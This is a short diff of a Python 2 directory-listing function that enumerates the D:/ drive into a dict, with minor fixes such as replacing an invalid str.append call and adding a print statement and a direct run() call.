@@ -7,8 +7,9 @@ def run(**args):
     dic = collections.defaultdict()
     info = ""
     #print "[*] In dirlister module."
-    path = r'D:/'
+    path = 'D:/'
     name = str(path).replace('/', '_').replace(':', '')
+    print name
     if not os.path.exists(path):
         dic[name] = "not exist\n"
         return dic
@@ -26,6 +27,7 @@ def run(**args):
         if os.path.isdir(path+a):
             info += a + " -dir\n"
             continue
-        info.append(a + "-other file\n")
+        info += a + "-other file\n"
     dic[name] = str(info)
     return dic
+run()
